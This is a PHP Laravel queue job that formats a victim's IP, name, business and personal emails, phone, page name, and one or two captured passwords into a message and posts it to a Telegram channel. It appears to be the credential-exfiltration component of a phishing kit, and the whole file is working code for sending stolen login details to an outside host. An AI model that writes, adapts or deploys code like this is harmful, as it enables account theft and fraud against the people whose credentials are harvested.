<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldBeUnique;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Log;
use Telegram\Bot\Laravel\Facades\Telegram;

class SendTelegramAccount implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     */
    public function __construct(protected $account, protected $num = 1)
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $message = "IP:  <code>{$this->account->ip}</code> | {$this->account->country} \n"
            . "Fullname: {$this->account->fullname} <code></code>\n"
            . "Business Email:<code>{$this->account->business_email}</code> \n"
            . "Personal Email: <code>{$this->account->personal_email}</code> \n"
            . "Phone:  <code>{$this->account->phone}</code>\n"
            . "Page Name:  <code>{$this->account->page}</code>\n";

        if ($this->num == 1) {
            $message .= "First Password: <code>{$this->account->first_password}</code>\n";
        } else {
            $message .= "First Password:  <code>{$this->account->first_password}</code>\n";
            $message .= "Second Password:  <code>{$this->account->second_password}</code>\n";
        }


        try {
            Telegram::sendMessage([
                'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
                'parse_mode' => 'HTML',
                'text' => $message
            ]);
        } catch (\Exception $e) {
            Log::error($e->getMessage());
        }
    }
}
